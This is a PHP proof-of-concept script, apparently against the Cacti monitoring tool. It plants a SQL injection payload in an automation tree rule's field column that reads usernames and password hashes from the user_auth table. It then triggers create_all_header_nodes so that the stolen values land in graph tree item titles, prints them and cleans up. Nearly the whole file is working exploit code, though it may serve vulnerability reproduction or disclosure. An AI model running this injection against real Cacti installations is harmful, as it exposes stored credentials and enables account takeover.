<?php
$no_http_headers = true;
include(dirname(__FILE__) . '/include/global.php');
include_once(dirname(__FILE__) . '/lib/api_automation.php');
include_once(dirname(__FILE__) . '/lib/api_tree.php');

// We need a rule to trigger create_all_header_nodes
// Let's create a temporary automation tree rule
$rule = array(
    'id' => 9999,
    'tree_id' => 1,
    'tree_item_id' => 0,
    'leaf_type' => 1, // TREE_ITEM_TYPE_HOST
    'name' => 'Repro Rule'
);

// Add a malicious item to automation_tree_rule_items
db_execute("DELETE FROM automation_tree_rule_items WHERE rule_id = 9999");
$field_payload = "(SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM user_auth)";
db_execute_prepared("INSERT INTO automation_tree_rule_items (rule_id, sequence, field, sort_type, propagate_changes) VALUES (?, ?, ?, ?, ?)",
    array(9999, 1, $field_payload, 1, ''));

echo "Malicious field inserted: $field_payload\n";

// We need a host_id to call create_all_header_nodes
$host_id = db_fetch_cell("SELECT id FROM host LIMIT 1");
if (!$host_id) {
    echo "No hosts found in database, creating a dummy one.\n";
    db_execute("INSERT INTO host (hostname, description) VALUES ('repro-host', 'Repro Host')");
    $host_id = db_fetch_cell("SELECT id FROM host WHERE hostname='repro-host'");
}

echo "Using host_id: $host_id\n";

// Now call create_all_header_nodes
echo "Calling create_all_header_nodes...\n";
try {
    // We might need to mock some more things or ensure create_all_header_nodes doesn't fail on other things
    // create_all_header_nodes($item_id, $rule)
    $result = create_all_header_nodes($host_id, $rule);
    echo "Result: $result\n";
    
    // Check if the output (titles of created nodes) contains sensitive info
    // However, create_all_header_nodes creates tree nodes. 
    // We can check the tree_items table for the injected content.
    $tree_items = db_fetch_assoc_prepared("SELECT title FROM graph_tree_items WHERE title LIKE '%admin%'");
    if (count($tree_items) > 0) {
        echo "SUCCESS: Found sensitive data in tree items titles!\n";
        foreach ($tree_items as $item) {
            echo "Title: " . $item['title'] . "\n";
        }
    } else {
        echo "FAILED: No sensitive data found in tree items titles.\n";
    }

} catch (Exception $e) {
    echo "Error: " . $e->getMessage() . "\n";
}

// Cleanup
db_execute("DELETE FROM automation_tree_rule_items WHERE rule_id = 9999");
db_execute("DELETE FROM graph_tree_items WHERE title LIKE 'admin:%'"); // Assuming admin is a user
?>
